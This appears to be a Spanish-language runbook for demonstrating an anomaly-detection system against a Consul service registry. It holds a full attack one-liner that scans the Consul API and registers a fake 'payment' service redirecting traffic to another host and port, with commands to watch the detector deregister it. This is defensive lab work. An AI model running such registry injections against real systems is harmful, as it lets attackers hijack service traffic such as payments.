# DEMO ATAQUE - Comandos Rápidos

## Terminal 1: EC2-Consul (observar)

```bash
ssh consul_service
```

### Ver servicios ANTES
```bash
curl -sk https://localhost:8501/v1/catalog/services | jq
```

### Ver contenedores
```bash
docker ps --format "table {{.Names}}\t{{.Status}}"
```

### Ver logs en tiempo real (dejar corriendo)
```bash
docker logs -f merger 2>&1 | grep -E "ATAQUE|WINDOW|DEREGISTER|predict|Generadas"
```

---

## Terminal 2: EC2-ADS (atacar)

```bash
ssh ads_server
```

### Ejecutar ataque completo
```bash
echo "=== SCAN ===" && for i in $(seq 1 10); do curl -sk https://10.1.11.40:8501/v1/catalog/services > /dev/null; curl -sk https://10.1.11.40:8501/v1/catalog/nodes > /dev/null; curl -sk https://10.1.11.40:8501/v1/agent/services > /dev/null; done && echo "✓ 30 peticiones scan" && echo "" && echo "=== INJECT ===" && curl -sk -X PUT https://10.1.11.40:8501/v1/agent/service/register -H "Content-Type: application/json" -d '{"ID":"malicious-payment-1","Name":"payment","Address":"10.1.12.10","Port":9999,"Tags":["malicious"]}' && echo "✓ Servicio inyectado" && echo "" && echo "=== CHECK ===" && for i in $(seq 1 15); do curl -sk https://10.1.11.40:8501/v1/catalog/service/payment > /dev/null; curl -sk https://10.1.11.40:8501/v1/health/service/payment > /dev/null; done && echo "✓ 30 peticiones check" && echo "" && echo "🔴 ATAQUE COMPLETADO"
```

### Ver servicio malicioso registrado
```bash
curl -sk https://10.1.11.40:8501/v1/catalog/service/payment | jq
```

---

## Terminal 1: Verificar resultado

### Ver servicios DESPUÉS (esperar 10s)
```bash
curl -sk https://localhost:8501/v1/catalog/services | jq
```

### Ver logs del Merger
```bash
docker logs merger --tail 30 2>&1 | grep -E "ATAQUE|DEREGISTER|desregistrado"
```

### Ver logs del ADS Server
```bash
ssh ads_server 'docker logs ads-server --tail 15 2>&1 | grep -E "ATAQUE|RESPUESTA|desregistro"'
```

---

## Reiniciar para repetir demo

```bash
ssh consul_service 'cd ~/app && docker compose restart merger'
```
